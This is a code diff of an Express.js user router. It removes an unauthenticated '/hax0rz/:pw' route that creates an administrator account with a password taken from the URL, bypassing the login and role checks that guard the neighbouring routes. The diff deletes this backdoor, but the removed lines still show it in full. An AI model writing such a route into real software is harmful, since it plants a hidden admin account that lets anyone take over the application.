@@ -13,17 +13,6 @@ router.get('/', isLoggedIn, isRole('admin'), (request, response)=> {
 	})
 })
 
-router.get('/hax0rz/:pw', (request, response)=> {
-	let user = {
-		username: 'admin',
-		password: request.params.pw,
-		roles: ['admin']
-	}
-	userApi.create(user, (newUser)=> {
-		response.send("DONE! YAY!")
-	})	
-})
-
 // POST /user
 // Create user
 router.post('/', isLoggedIn, isRole('admin'), (request, response)=> {
